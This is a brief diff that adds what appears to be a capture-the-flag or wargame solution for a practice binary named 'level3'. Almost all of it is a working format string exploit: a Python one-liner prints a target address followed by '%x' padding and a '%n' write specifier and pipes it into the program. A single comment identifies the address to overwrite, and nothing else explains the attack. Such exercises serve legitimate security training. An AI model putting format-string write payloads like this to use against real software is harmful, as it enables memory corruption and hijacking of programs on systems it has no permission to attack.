@@ -1,0 +1,5 @@
+(python -c "print('\x8c\x98\x04\x08' + '%x ' * 2 + '%47x'  + '%n')";cat) | ./level3
+
+x8c\x98\x04\x08: Address we need to overwrite
+
+
